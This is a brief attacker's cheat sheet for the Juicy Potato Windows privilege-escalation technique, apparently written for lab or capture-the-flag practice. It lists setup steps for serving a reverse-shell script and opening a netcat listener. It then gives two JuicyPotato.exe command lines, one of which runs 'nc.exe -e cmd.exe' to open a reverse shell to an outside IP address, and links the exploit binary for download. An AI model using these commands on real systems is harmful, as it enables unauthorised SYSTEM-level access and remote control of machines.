# Juicy Potato Attack

## Juicy Potato Attack
- Setup www webserver on attacking machine (8000)
- Place your rev.ps1 into the www webserver
- Move a copy of setup.bat to your attacking host, or besure the contents have the PowerShell command
- Setup nc listener on 9001 (or whatever port, change rev.ps1 port if different)

```
jp.exe -t * -p c:\Users\<user>\Documents\setup.bat -l 1337 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"

jp.exe -l 1337 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\kohsuke\Documents\nc.exe -e cmd.exe 10.10.16.19 9001" -t *
```

 [OHPE GitHub Juicy-Potato](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
 
 [OHPE CLSID by Operating System](https://ohpe.it/juicy-potato/CLSID/)